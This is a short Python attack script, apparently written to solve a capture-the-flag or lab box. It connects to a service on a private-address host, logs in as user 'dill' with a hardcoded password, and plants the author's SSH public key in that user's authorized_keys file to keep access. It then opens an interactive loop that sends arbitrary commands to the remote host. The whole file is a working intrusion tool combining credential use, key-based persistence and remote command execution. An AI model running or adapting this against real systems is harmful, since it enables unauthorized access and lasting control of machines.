import socket

def send(s, txt):
    s.sendall(bytes(txt, 'utf-8'))
    return s.recv(2048)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('10.10.124.62',7321))

    send(s, 'dill')
    send(s, 'n3v3r_@_d1ll_m0m3nt')
    print(s.recv(2048))

    with open("/home/srini/.ssh/id_rsa.pub", 'rb') as pubkey:
        pubkey_data = pubkey.read().strip()
        send(s, "echo {} >> /home/dill/.ssh/authorized_keys".format(pubkey_data))
        print(s.recv(2048))

    try:
        while True:
            cmd = input('CMD: ')
            if len(cmd) == 0:
                continue
            else:
                op = send(s, cmd)
                print(op)
                print("----------")
                s.recv(2048)
    except Exception as e:
        print(e)
        s.close()